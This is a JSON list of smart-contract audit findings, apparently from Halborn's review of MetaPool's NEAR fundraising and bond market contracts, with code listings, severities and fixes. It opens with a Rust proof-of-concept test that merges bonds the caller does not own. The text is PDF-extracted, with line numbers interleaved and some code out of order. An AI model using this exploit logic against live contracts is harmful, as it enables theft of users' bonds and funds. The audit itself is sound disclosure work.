178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 . into_result () ?; let katherine_owner_account = root_account . create_subaccount (\" katowner \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let kickstarter_owner_account = root_account . create_subaccount (\" kickowner \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let metapool_account = root_account . create_subaccount (\" metapool \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let katherine_account = root_account . create_subaccount (\" katherine \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let supporter_account = root_account . create_subaccount (\" supporter \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let buyer_account = root_account . create_subaccount (\" buyer \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; 23 let bond_market_owner_account = root_account . create_subaccount (\" bondmarket - owner \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let bond_operator_owner = root_account . create_subaccount (\" bondoperator - owner \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let bond_market_operator_account = root_account . create_subaccount (\" bondoperator \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let bond_market_account = root_account . create_subaccount (\" bondmarket \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let ptoken_account = root_account . create_subaccount (\" ptoken \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 // deploying contracts let metapool_contract = deploy_meta_pool (&  katherine_owner_account , & metapool_account ). await ?; 234 235 let ptoken_contract = deploy_ptoken (& katherine_owner_account ,  & ptoken_account ). await ?; 236 237 238 let bond_market_contract = deploy_bond_market ( & bond_market_owner_account , & bond_market_account , 24 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 metapool_contract . id () , ) . await ?; let bond_operator_contract = deploy_operator ( & bond_operator_owner , & bond_market_operator_account , & metapool_account , & bond_market_contract , & bond_market_owner_account , ) . await ?; let current_epoch : EpochMillis = metapool_contract . call ( \" get_epoch \" ) . args_json ( json! ({}) ) . view () . await ? . json () ?; println! (\" CURRENT EPOCH : {} \" , current_epoch ); mint_ptokens ( & ptoken_contract , & katherine_owner_account , vec! [ // & katherine_owner_account , & katherine_account , & supporter_account , & buyer_account , ], ) . await ?; let now = Now :: new_from_epoch_millis ( metapool_contract . call (\"  get_epoch \"). view () . await ?. json () ?) ; 272 273  () ; let stnear_freeze_timestamp : EpochMillis = now . to_epoch_millis 274 let stnear_vault_maturity_datetime : EpochMillis = now .  increment_min (40) . to_epoch_millis () ; 275 let ptoken_start_linear_release_datetime : EpochMillis = now .  increment_min (15) . to_epoch_millis () ; 276 let ptoken_vault_maturity_datetime : EpochMillis = now .  increment_min (40) . to_epoch_millis () ; 277 25 278 279 // Import testing bonds let content = fs :: read_to_string ( BONDS_FILEPATH ). expect ( \" Error  reading bond file \"); 280 281 282 283 284 285 286 287 288 289 290 291 let bonds_json = json_reader :: parse (& content ) ?; let bonds = bonds_json [\" bonds \" ]. clone () ; // Vault parameters let vault_id = String :: from ( \" TEST_vault_id \"); let stnear_price_at_freeze : U128 = metapool_contract . call ( \" get_st_near_price \") . view () . await ? . json () ?; let initial_stnear_balance : U128 = calculate_stnear_balance ( bonds . clone () ,  stnear_price_at_freeze . clone () ); 292 let initial_ptoken_balance : U128 = calculate_ptoken_balance (  bonds . clone () ); 293 let ptoken_contract_address : AccountId = ptoken_contract . id () .  clone () ; 294 let interest_beneficiary_until_unfreeze : AccountId =  kickstarter_owner_account . id () . clone () ; 295 296 let interest_beneficiary_near_claimed : U128 = U128 :: from (0) ; let bond_owners_near_claimed : U128 = calculate_near_claimed (  bonds . clone () ); 297 let bond_owners_ptoken_claimed : U128 =  calculate_ptoken_claimed ( bonds . clone () ); 298 let vault_owner_id : AccountId = katherine_owner_account . id () .  clone () ; 299 300 301 302 303 304 305 306 307 308 309 // Create a vault let res = bond_operator_owner . call ( bond_operator_contract . id () , \" create_vault \" ) . args_json ( serde_json :: json! ({ \" vault_id \": vault_id , \" stnear_price_at_freeze \": stnear_price_at_freeze , \" initial_stnear_balance \": initial_stnear_balance , \" initial_ptoken_balance \": initial_ptoken_balance , \" ptoken_contract_address \" : ptoken_contract_address , \" stnear_freeze_timestamp \" : U64 :: from (  stnear_freeze_timestamp ) , 310 \" interest_beneficiary_until_unfreeze \" :  interest_beneficiary_until_unfreeze , 26 311 \" interest_beneficiary_near_claimed \":  interest_beneficiary_near_claimed , 312 313 \" bond_owners_near_claimed \": bond_owners_near_claimed , \" bond_owners_ptoken_claimed \" :  bond_owners_ptoken_claimed , 314 \" stnear_vault_maturity_datetime \": U64 :: from (  stnear_vault_maturity_datetime ) , 315 \" ptoken_start_linear_release_datetime \": U64 :: from (  ptoken_start_linear_release_datetime ) , 316 \" ptoken_vault_maturity_datetime \": U64 :: from (  ptoken_vault_maturity_datetime ) , 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 \" vault_owner_id \" : vault_owner_id , }) ) . gas ( parse_gas! (\" 200 Tgas \" ) as u64 ) . transact () . await ? . into_result () ?; println! (\" Create vault : {:?}\\ n \" , res ); registering_accounts ( & metapool_contract , & ptoken_contract , & bond_operator_contract , & katherine_owner_account , & supporter_account , & buyer_account , & kickstarter_owner_account , & bond_operator_owner , ) . await ?; sending_stnear_ptoken_to_vault ( & metapool_contract , & ptoken_contract , & bond_operator_contract , & katherine_owner_account , & bond_operator_owner , initial_stnear_balance , initial_ptoken_balance , vault_id . clone () , ) . await ?; sending_stnear_ptoken_to_vault ( & metapool_contract , 27 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 & ptoken_contract , & bond_operator_contract , & katherine_owner_account , & bond_operator_owner , initial_stnear_balance , initial_ptoken_balance , vault_id . clone () , ) . await ?; let loader_bonds = create_bond_loader ( bonds , vault_id . clone () , supporter_account . id () . clone () , ptoken_contract_address . clone () , U64 :: from (4 * stnear_vault_maturity_datetime ) , U64 :: from (4 * ptoken_start_linear_release_datetime ) , U64 :: from (4 * ptoken_vault_maturity_datetime ) , ); let res = bond_operator_owner . call ( bond_operator_contract . id () , \" create_bonds \" ) . args_json ( serde_json :: json! ({ \" bonds \" : loader_bonds }) ) . gas ( parse_gas! (\" 200 Tgas \" ) as u64 ) . transact () . await ? . into_result () ?; println! (\" Create bonds : {:?}\\ n \" , res ); let bond1 : BondJSON = bond_operator_contract . call ( \" get_bond \") . args_json ( json! ({ \" bond_id \": 1, }) ) . view () . await ? . json () ?; println! (\" \\ nBOND1 : {:#?} \" , bond1 ); let bond3 : BondJSON = bond_operator_contract . call ( \" get_bond \") . args_json ( json! ({ \" bond_id \": 3, }) ) 28 394 395 396 397 398 399 400 401 402 . view () . await ? . json () ?; println! (\" \\ nBOND3 : {:#?} \" , bond3 ); // 1. Putting bond 3 on sale let price = U128 :: from (10 * ONE_NEAR ); let bond_sale_result = supporter_account . call ( bond_market_contract . id () , \"  create_bond_sale_in_millisecs \") 403 404 405 406 407 408 . args_json ( json! ({ \" bond_id \": 3, \" bond_operator_address \" : bond_operator_contract . id () , \" price \": price , \" currency \" : \" NEAR \" , \" sale_duration_in_millisecs \" : U64 :: from (20 * 1000) , //  20 seconds 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 \" is_auction \": true , }) ) . max_gas () . deposit (1000000000000000000000000) . transact () . await ? . into_result () ?; println! (\" SALE RESULT : {:#?} \" , bond_sale_result ); let bond3 : BondJSON = bond_operator_contract . call ( \" get_bond \") . args_json ( json! ({ \" bond_id \": 3, }) ) . view () . await ? . json () ?; println! (\" \\ nBOND3 after putting on sale : {:#?} \" , bond3 ); let sale : SaleJSON = bond_market_contract . call ( \" get_sale \") . args_json ( json! ({ \" sale_id \" : 0}) ) . view () . await ? . json () ?; println! (\" SALE : {:#?} \" , sale ); 29 436 437 438 // placing a bid let halborn_account_balance_before_bid = halborn_account .  view_account () . await ?. balance ; 439 440 441 442 443 444 445 446 447 let _bid_result = halborn_account . call ( bond_market_contract . id () , \" place_a_near_bid \" ) . args_json ( json! ({ \" sale_id \" : 0}) ) . deposit ( price .0 + 1) . max_gas () . transact () . await ? . into_result () ?; let halborn_account_balance_after_bid = halborn_account .  view_account () . await ?. balance ; 448 449 450 println! ( \" Balance :\\ n {}\\ n {} \" , halborn_account_balance_before_bid ,  halborn_account_balance_after_bid ); let sale : SaleJSON = bond_market_contract . call ( \" get_sale \") . args_json ( json! ({ \" sale_id \" : 0}) ) . view () . await ? . json () ?; println! (\" \\ nSALE after bid : {:#?} \" , sale ); // trying to merge bond 1 and 3 halborn_account . call ( bond_operator_contract . id () , \" merge_bonds \" ) . args_json ( json! ({ \" bond_id \": 1, \" other_id \" : 3, }) ) . transact () . await ? . into_result () ?; // waiting for over 20 seconds for the sale to end ... println! (\" Waiting for the auction to end ... \" ); tokio :: time :: sleep ( tokio :: time :: Duration :: from_secs (21) ) . await 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475  ; 30 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 } println! (\" Auction should be done by now ... \"); // trying to complete the auction sale ... let pull_result = halborn_account . call ( bond_market_contract . id () , \" pull_sale_bond \" ) . args_json ( json! ({ \" sale_id \": 0 }) ) . max_gas () . transact () . await ? . into_result () ?; println! (\" \\ nPULL RESULT : {:#?} \" , pull_result ); let sale : SaleJSON = bond_market_contract . call ( \" get_sale \") . args_json ( json! ({ \" sale_id \" : 0}) ) . view () . await ? . json () ?; println! (\" \\ nSale after trying to pull it : {:#?} \" , sale ); let halborn_account_balance_after_trying_to_pull = halborn_account . view_account () . await ?. balance ; println! ( \" Balance after trying to complete auction : {} \" , halborn_account_balance_after_trying_to_pull ); let remove_bid_result = halborn_account . call ( bond_market_contract . id () , \" remove_loser_bid \" ) . args_json ( json! ({ \" sale_id \" : 0}) ) . transact () . await ? . into_result () ; if let Err ( res ) = remove_bid_result { println! ( \" ERR : {} \" , res ); } Ok (() ) 31 Recommendation: It is recommended to implement an authorization check in the merge_bonds function so that only the user who owns both bonds can merge them. Additionally, merging and splitting bonds should be possible only for bonds that are not on sale. Remediation Plan: SOLVED: The MetaPool has solved this issue in commit ef7772ff by adding a verification mechanism that makes sure only the owner can merge bonds and only if neither bond is on sale. 32 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Critical"
        ]
    },
    {
        "title": "LOSS OF REWARDS DUE TO KICKSTARTER UPDATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "contract, specifically in the function update_kickstarter. Our analysis revealed a potential vulnerability in the KatherineFundraising This function allows either the contracts owner or Kickstarters owner to modify details pertaining to the fundraising effort. However, the implementation of the update_kickstarter function is flawed as it inadvertently resets storage variables tied to the Kickstarter, including the available_rewards_tokens. The available_rewards_tokens variable is crucial, as it stores the quan- tity of project tokens (ptokens) available to be offered as rewards for supporters. The current implementation of the update_kickstarter func- tion, however, resets this variable to zero each time it is called. As a result, it can unintentionally erase information regarding the remaining ptokens, leading to their loss. Interestingly, this loss of reward tokens occurs even if there are no changes made to the ptoken contract itself. This issue poses a significant threat to the integrity of the fundraising efforts, as it could lead to supporters not receiving the ptokens they were promised, thereby undermining trust in the system. Further, the loss of ptokens could negatively impact the overall fundraising process. Thus, it is essential to address this vulnerability, to ensure proper functioning of the update_kickstarter function, and maintain the accurate count of available_rewards_tokens to protect the integrity and reliability of the KatherineFundraising contract. Code Location: Down below is a code snippet from the internal_update_kickstarter func- tion: 33 Listing 3: contracts/katherine-fundraising-contract/src/kickstarter.rs (Line 412) 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 pub ( crate ) fn internal_update_kickstarter ( & mut self , old_kickstarter : Kickstarter , name : String , slug : String , owner_id : AccountId , open_timestamp : EpochMillis , close_timestamp : EpochMillis , token_contract_address : AccountId , deposits_hard_cap : U128 , max_tokens_to_release_per_stnear : U128 , token_contract_decimals : u8 ) { assert! ( old_kickstarter . open_timestamp >=  get_current_epoch_millis () , 379 \" Changes are not allow after the funding period  started! \" 380 381 382 383 384 385 386 387 ); let id = old_kickstarter . id ; let kickstarter = Kickstarter { id , name , slug , goals : Vector :: new ( Keys :: Goals . as_prefix (& id . to_string  () ). as_bytes () ) , 388 389 390 391 winner_goal_id : None , katherine_fee : None , total_tokens_to_release : None , deposits : UnorderedMap :: new ( Keys :: Deposits . as_prefix (&  id . to_string () ). as_bytes () ) , 392 393  as_bytes () , 394 395 396  as_bytes () , rewards_withdraw : UnorderedMap :: new ( Keys :: RewardWithdraws . as_prefix (& id . to_string () ). ) , stnear_withdraw : UnorderedMap :: new ( Keys :: StnearWithdraws . as_prefix (& id . to_string () ). 397 398 399 ) , total_deposited : 0, deposits_hard_cap : deposits_hard_cap .0 , 34 400 max_tokens_to_release_per_stnear :  max_tokens_to_release_per_stnear .0 , enough_reward_tokens : false , owner_id , active : true , successful : None , stnear_price_at_freeze : None , stnear_price_at_unfreeze : None , creation_timestamp : get_current_epoch_millis () , open_timestamp , close_timestamp , token_contract_address , token_contract_decimals , available_reward_tokens : 0 , }; kickstarter . assert_timestamps () ; self . kickstarters . replace ( id as u64 , & kickstarter ); self . kickstarter_id_by_slug . remove (& old_kickstarter . slug ); self . kickstarter_id_by_slug . insert (& kickstarter . slug , & kickstarter . id ); } 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:C/R:N/S:U (2.0) Recommendation: It is recommended to implement an update_kickstarter function in a way that will not generate value loss in an underlying asset. If the AccoundId associated with ptoken is not changed, then the available_reward_tokens value should not be zeroed-out. On the other hand, if that AccountId changes, then returning already sent tokens to the previous owner may be considered. 35 Remediation Plan: SOLVED: The MetaPool team has solved this issue in commit efadbdc7 by deprecating (and effectively deleting) the update_kickstarter function. 36 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "DENIAL OF SERVICE CONDITION DUE TO STORAGE BLOATING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "During our analysis, we identified a potential issue with the create_vault function, which pertains to the handling of deposit amounts associated with storage fees. The function currently adds values to the contracts storage without ensuring that a sufficient deposit has been sent with the call to cover these storage costs. Importantly, the design of the create_vault function does not currently allow for a deposit to be made at the time of the call. Without an accompanying deposit, the contract is forced to compensate for storage fees from its own free balance. If the contracts free balance is insufficient, the call to create_vault will fail due to lack of funds to cover the storage fees. This situation presents a considerable vulnerability, as it potentially disrupts the contracts operations and the creation of new vaults. More- over, it places an undue burden on the contracts free balance, which could have serious implications if it is not properly monitored and managed. Code Location: Down below is a code snippet from the create_vault function: Listing 4: contracts/bond-operator-contract/src/lib.rs 146 pub fn create_vault ( & mut self , 147 vault_id : VaultId , 148 stnear_price_at_freeze : U128 , 149 initial_stnear_balance : U128 , 150 initial_ptoken_balance : U128 , 151 37 ptoken_contract_address : String , stnear_freeze_timestamp : U64 , interest_beneficiary_until_unfreeze : String , interest_beneficiary_near_claimed : U128 , bond_owners_near_claimed : U128 , bond_owners_ptoken_claimed : U128 , stnear_vault_maturity_datetime : U64 , ptoken_start_linear_release_datetime : U64 , ptoken_vault_maturity_datetime : U64 , vault_owner_id : String self . assert_only_owner () ; self . assert_new_vault_id (& vault_id ); let vault = Vault :: new ( vault_id . clone () , stnear_price_at_freeze .0 , initial_stnear_balance .0 , initial_ptoken_balance .0 , ptoken_contract_address . try_into () . unwrap () , stnear_freeze_timestamp .0 , interest_beneficiary_until_unfreeze . try_into () . unwrap () , interest_beneficiary_near_claimed .0 , bond_owners_near_claimed .0 , bond_owners_ptoken_claimed .0 , stnear_vault_maturity_datetime .0 , ptoken_start_linear_release_datetime .0 , ptoken_vault_maturity_datetime .0 , vault_owner_id . try_into () . unwrap () ); self . vaults . insert (& vault_id , & vault ); 152 153 154 155 156 157 158 159 160 161 162 ) { 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:F/S:U (0.5) Recommendation: To address this issue, it is recommended to revise the create_vault function to accept a deposit that can adequately cover the storage fees. 38 This will ensure the contracts free balance is preserved and prevent the disruption of contract operations due to insufficient funds. Remediation Plan: SOLVED: The MetaPool team solved this issue in commits 164fecd8 and 7e108822 by implementing a requirement for the caller to cover the storage fee associated with creating a new vault. 39 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT STATE VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "It was observed that the KatherineFundrasing contract implements a manual assertion in new function that checks if the contracts state already exists. However, the new function is also marked with #[init] macro which implements this behavior by default, making manual assertion redundant Code Location: Down below is a code snippet from the new function: Listing 5: contracts/katherine-fundraising-contract/src/lib.rs (Lines 45,52) Self { 45 #[ init ] 46 pub fn new ( 47 48 49 50 51 ) -> Self { 52  initialized \" ); 53 54 55 56 57  KickstarterId ) , 58 59 60 61 62 63 64 } } owner_id : AccountId , min_deposit_amount : U128 , metapool_contract_address : AccountId , katherine_fee_percent : BasisPoints , assert! ( !env :: state_exists () , \" The contract is already owner_id , supporters : UnorderedMap :: new ( Keys :: Supporters ) , kickstarters : Vector :: new ( Keys :: Kickstarters ) , kickstarter_id_by_slug : UnorderedMap :: new ( Keys :: min_deposit_amount : min_deposit_amount .0 , metapool_contract_address , katherine_fee_percent , max_goals_per_kickstarter : 5, active_projects : UnorderedSet :: new ( Keys :: Active ) , 40 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove redundant code. Remediation Plan: SOLVED: The MetaPool team has solved this issue in commit 6727d175 by removing the redundant code. 41 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT MANUAL CALLBACK ASSERTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "The activate_successful_kickstarter_after function is marked with #[ private] macro, which allows this function to only be called by the con- tract itself. However, it was observed that this function is also manually asserting that the predecessor_account_id is equal to current_account_id. Code Location: Down below is a code snippet from the assert_self function: Listing 6: near-sdk-3.1.0/src/utils/mod.rs assert_eq! ( env :: predecessor_account_id () , env :: 16 pub fn assert_self () { 17  current_account_id () , \" Method is private \"); 18 } Down below is a code snippet from the activate_successful_kickstarter_after function: Listing 7: (Lines 97,103) contracts/katherine-fundraising-contract/src/internal.rs pub fn activate_successful_kickstarter_after ( 97 #[ private ] 98 99 100 101 102 103 104 105 ) { & mut self , kickstarter_id : KickstarterId , goal_id : GoalId , assert_self () ; assert_eq! ( env :: promise_results_count () , 42 106 107 108 109 110 111 112 1, \" This is a callback method \" ); let st_near_price = match env :: promise_result (0) { PromiseResult :: NotReady => unreachable! () , PromiseResult :: Failed => panic! (\" Meta Pool is not  available! \" ) , 113 114 PromiseResult :: Successful ( result ) => { let price = near_sdk :: serde_json :: from_slice :: < U128  >(& result ). unwrap () ; price .0 115 116 117 118 }, }; let mut kickstarter = self . internal_get_kickstarter (  kickstarter_id ); 119 120 121 122 match kickstarter . goals . get ( goal_id as u64 ) { None => panic! (\" Kickstarter did not achieved any goal! \") , Some ( goal ) = > { let total_tokens_to_release = self .  calculate_total_tokens_to_release ( 123 124 125 126 & kickstarter , goal . tokens_to_release_per_stnear ); let katherine_fee = self . calculate_katherine_fee (  total_tokens_to_release ); 127 128 assert! ( kickstarter . available_reward_tokens >= (  total_tokens_to_release + katherine_fee ) , 129 \" Not enough available reward tokens to back the  supporters rewards! \" 130 131 132 133 134 135 136 ); kickstarter . winner_goal_id = Some ( goal . id ); kickstarter . active = false ; self . active_projects . remove (& kickstarter . id ); kickstarter . successful = Some ( true ); kickstarter . katherine_fee = Some ( katherine_fee ); kickstarter . total_tokens_to_release = Some (  total_tokens_to_release ); 137 kickstarter . stnear_price_at_freeze = Some (  st_near_price . into () ); 138 139 140 } self . kickstarters . replace ( kickstarter_id as u64 , & kickstarter ); 43 } 141 142 143 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove redundant code. Remediation Plan: SOLVED: The MetaPool team has solved this issue in commit abe7e854 by removing redundant code. 44 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "NOT NECESSARY MACRO USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "Some impl blocks of KatherineFundraising contract are marked with #[ near_bindgen] macro, although they define only internal functions. Code Location: Down below is a code snippet from the internal_create_goal function: Listing 8: contracts/katherine-fundraising-contract/src/goal.rs (Lines 36,38,93) pub ( crate ) fn internal_create_goal ( & mut self , kickstarter : & mut Kickstarter , name : String , desired_amount : U128 , unfreeze_timestamp : EpochMillis , tokens_to_release_per_stnear : U128 , cliff_timestamp : EpochMillis , end_timestamp : EpochMillis , ) -> GoalId { 36 #[ near_bindgen ] 37 impl KatherineFundraising { 38 39 40 41 42 43 44 45 46 47 48 49 50  max_goals_per_kickstarter ); 51 52 53  tokens_to_release_per_stnear .0; 54 55 56 57  \" let desired_amount = desired_amount .0; let tokens_to_release_per_stnear = kickstarter . assert_goal_status () ; kickstarter . assert_before_funding_period () ; kickstarter . assert_number_of_goals ( self . let id = kickstarter . get_number_of_goals () ; assert! ( kickstarter . deposits_hard_cap >= desired_amount , \" Desired amount must not exceed the deposits hard cap! 45 kickstarter . max_tokens_to_release_per_stnear >= \" Tokens to release must not exceed the max tokens to let last_goal = kickstarter . goals . get (( id - 1) as u64 ) desired_amount >= last_goal . desired_amount , \" Next goal cannot have a lower desired amount that unfreeze_timestamp <= last_goal . unfreeze_timestamp \" Next goal cannot freeze supporter funds any tokens_to_release_per_stnear >= last_goal . \" Next goal cannot release less pTOKEN than the assert! ( ); assert! ( ); assert! ( 58 59 60  tokens_to_release_per_stnear , 61  release per stNEAR! \" ); 62 if id > 0 { 63 64  . unwrap () ; 65 66 67  the last goal! \" 68 69 70  , 71  longer than the last goal! \" ); 72 assert! ( 73 74  tokens_to_release_per_stnear , 75  last goal! \" 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 } let goal = Goal { goal . id ); } id , name , desired_amount , unfreeze_timestamp , tokens_to_release_per_stnear , cliff_timestamp , end_timestamp , }; kickstarter . goals . push (& goal ); self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); 46 pub ( crate ) fn internal_delete_last_goal (& mut self , kickstarter 93  : & mut Kickstarter ) { 94 95 96 97 98 99 100 } } kickstarter . assert_goal_status () ; kickstarter . assert_before_funding_period () ; kickstarter . goals . pop () ; self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); Down below is a code snippet from the assert_min_deposit_amount function: 9: Listing (Lines 45,47,56,83) contracts/katherine-fundraising-contract/src/deposit.rs fn assert_min_deposit_amount (& self , amount : Balance ) { amount >= self . min_deposit_amount , \" minimum deposit amount is {} \" , self . min_deposit_amount } ); assert! ( 45 #[ near_bindgen ] 46 impl KatherineFundraising { 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  amount ; 67 68 69 70 71 assert! ( ) { // / Process a stNEAR deposit to Katherine Contract . fn process_supporter_deposit ( & mut self , supporter_id : & AccountId , amount : & Balance , kickstarter : & mut Kickstarter , // Update Kickstarter kickstarter . assert_within_funding_period () ; kickstarter . assert_enough_reward_tokens () ; let new_total_deposited = kickstarter . total_deposited + new_total_deposited <= kickstarter . deposits_hard_cap , \" The deposits hard cap cannot be exceeded! \" ); kickstarter . total_deposited = new_total_deposited ; 47 } ) { self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); kickstarter . update_supporter_deposits (& supporter_id , & mut self , amount : Balance , kickstarter : & mut Kickstarter , // Update Supporter . let mut supporter = self . internal_get_supporter (& supporter . supported_projects . insert (& kickstarter . id ); self . supporters . insert (& supporter_id , & supporter ); // / Process a reward token deposit to Katherine Contract . fn process_kickstarter_deposit ( 72  amount ); 73 74 75 76 77  supporter_id ); 78 79 80 81 82 83 84 85 86 87 88 89 90 91  contract .\" 92 93 94  close_timestamp , 95  funding period ends . \" ); 96 let amount = kickstarter . less_to_24_decimals ( amount ); 97 let max_tokens_to_release = self . 98  calculate_max_tokens_to_release (& kickstarter ); 99 100 101 102 103 kickstarter . available_reward_tokens += amount ; kickstarter . enough_reward_tokens = { \" Kickstarter Tokens should be provided before the get_current_epoch_millis () < kickstarter . kickstarter . available_reward_tokens >= ); assert! ( assert_eq! ( & env :: predecessor_account_id () , & kickstarter . token_contract_address , \" Deposited tokens do not correspond to the Kickstarter let min_tokens_to_allow_support = max_tokens_to_release + self . calculate_katherine_fee ( max_tokens_to_release );  min_tokens_to_allow_support }; self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); 104 105 106 107 108 } } 48 109 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the unnecessary #[near_bindgen] macro usage. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 25c435f5 by removing the unnecessary macro usage. 49 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "The KatherineFundraising contract defines a delete_kickstarter function. All the function does is cause the contract to panic with information that a Kickstarter cannot be deleted. The KatherineFundraising contract does not implement any standard that would require delete_kickstarter function to be present. As a consequence, there is no value originating from this function, yet it is present in the wasm binary making it bigger, which directly impacts the deployment costs. Code Location: Down below is a code snippet from the delete_kickstarter function: Listing 10: contracts/katherine-fundraising-contract/src/lib.rs (Line 363) 362 pub fn delete_kickstarter (& mut self , id : KickstarterId ) { 363 364 } panic! ( \" Kickstarter {} must not be deleted! \" , id ); BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to delete unnecessary function. 50 Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 6727d175 by removing the delete_kickstarter function. 51 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "DEAD CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "It was observed that the code present in the interest.rs file in the KatherineFundraising contract is completely commented out. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to delete files that are not adding a meaningful logic implementation. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 6727d175 by deleting the dead code. 52 ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "JAVASCRIPT INCOMPATIBLE TYPE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
